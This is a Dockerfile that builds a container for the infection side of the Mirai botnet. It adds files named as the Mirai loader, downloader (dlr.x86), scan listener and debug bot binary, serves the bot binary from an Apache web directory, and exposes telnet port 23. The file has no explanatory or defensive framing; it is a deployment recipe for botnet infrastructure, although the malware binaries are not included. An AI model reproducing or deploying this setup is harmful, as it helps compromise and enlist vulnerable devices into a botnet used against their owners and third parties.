FROM ubuntu:14.04.5
ADD loader.dbg /
ADD bins/dlr.x86 /
ADD scanListen /
ADD init.sh /
ADD mirai.dbg /
ADD checked /
RUN chmod +x init.sh && chmod +rwx checked
RUN apt-get -y update \
	&& apt-get install -y apache2
RUN mkdir /var/www/html/bins \
	&& mv mirai.dbg /var/www/html/bins \
	&& mkdir bins \
	&& mv dlr.x86 bins \
	&& update-rc.d apache2 enable
	
	
EXPOSE 23
